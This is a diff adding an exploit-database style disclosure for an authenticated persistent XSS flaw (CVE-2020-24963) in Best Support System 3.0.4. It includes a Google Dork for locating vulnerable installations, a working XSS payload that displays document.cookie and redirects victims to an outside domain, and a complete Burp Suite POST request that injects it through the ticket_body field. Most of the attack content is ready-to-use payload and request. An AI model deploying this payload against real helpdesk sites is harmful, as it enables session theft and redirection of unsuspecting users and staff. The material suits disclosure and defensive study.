@@ -1,0 +1,37 @@
+# Exploit Title: Best Support System 3.0.4 - 'ticket_body' Persistent XSS (Authenticated)
+# Google Dork: "Powered By Best Support System"
+# Date: 2020-08-23
+# Exploit Author: Ex.Mi [ https://ex-mi.ru ]
+# Vendor: Appsbd [ https://appsbd.com ]
+# Software Version: 3.0.4
+# Software Link: https://codecanyon.net/item/best-support-systemclient-support-desk-help-centre/21357317
+# Tested on: Kali Linux
+# CVE: CVE-2020-24963
+# CWE: CWE-79
+
+
+[i] :: Info:
+
+An Authenticated Persistent XSS vulnerability was discovered in the
+Best Support System, tested version — v3.0.4.
+
+
+[$] :: Payloads:
+
+13"-->">'` -- `<!--<img src="--><img src=x
+onerror=(alert)(`Ex.Mi`);(alert)(document.cookie);location=`https://ex-mi.ru`;>
+
+
+[!] :: PoC (Burp Suite POST request):
+
+POST /support-system/ticket-confirm/ticket-reply/11.html HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 350
+Origin: https://localhost
+Connection: close
+Referer: https://localhost/support-system/ticket/details/11.html
+Cookie: [cookies_here]
+
+app_form=8d1c319d5826a789b3ca3e71516b0c5c&ticket_body=%3Cp%3E%3Cbr%3E%3C%2Fp%3E13%22--%26gt%3B%22%26gt%3B'%60+--+%60%3C!--%3Cimg+src%3D%22--%3E%3Cimg+src%3D%22x%22+onerror%3D%22(alert)(%60Ex_Mi%60)%3B(alert)(document.cookie)%3Blocation%3D%60https%3A%2F%2Fex-mi.ru%60%3B%22%3E&status=&app_form_ajax=ad1ce2b2c3eb943efaa8c239ff53acc2
